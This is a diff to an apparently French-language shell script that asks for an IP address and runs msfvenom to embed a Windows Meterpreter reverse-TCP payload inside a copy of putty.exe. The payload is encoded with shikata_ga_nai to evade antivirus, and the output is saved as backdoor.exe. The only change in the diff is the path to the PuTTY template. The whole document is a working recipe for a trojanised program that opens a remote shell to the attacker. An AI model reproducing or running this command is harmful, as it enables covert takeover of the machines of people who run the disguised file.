@@ -20,7 +20,7 @@ then
 
 read -p "votre adresse ip : " ip
 
-msfvenom -a x86 -x /home/samglish/Téléchargements/putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" f exe -o backdoor.exe
+msfvenom -a x86 -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" f exe -o backdoor.exe
 
 echo "backdoor.exe created"
 
